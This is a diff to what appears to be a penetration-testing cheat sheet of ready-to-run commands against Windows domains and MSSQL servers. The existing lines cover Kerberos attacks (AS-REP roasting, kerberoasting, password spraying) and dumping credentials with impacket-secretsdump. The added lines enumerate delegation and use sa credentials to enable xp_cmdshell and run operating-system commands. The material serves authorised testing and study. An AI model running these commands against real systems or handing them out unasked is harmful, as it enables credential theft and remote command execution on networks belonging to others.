@@ -40,6 +40,7 @@ impacket-GetNPUsers $domain/$user #88
 impacket-GetNPUsers -request -dc-ip $rhost $domain/$user -outputfile $user-hash.asrep #88
 impacket-GetUserSPNs -request -dc-ip $rhost $domain/$user #88
 impacket-GetTGT $domain/$user:$password $88
+impacket-findDelegation $domain/$user:$password@$rhost
 kerbrute passwordspray -d $shortdomain --dc $rhost users.txt $password #88
 impacket-secretsdump $shortdomain/$user@$rhost #445 88
 certipy find -u $user@$domain -p $password -dc-ip $rhost
@@ -60,6 +61,8 @@ mssqlclient -p 1433 $shortdomain/$user:$password@$rhost #1433
 mssqlclient -p 1433 $user:$password@$rhost -windows-auth #1433
 mssqlclient -p 1433 $user@$rhost -windows-auth #1433
 mssqlclient -p 1433 -hashes LMHASH:NTHASH $shortdomain/$user:$password@192.168.1.5 #1433
+sqsh -S $rhost -U sa -P 'password123' -C "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+sqsh -S $rhost -U sa -P 'password123' -C "EXEC xp_cmdshell 'whoami';"
 
 ### Port 3306 (MySQL)
 mysql -h $rhost -u $user #3306
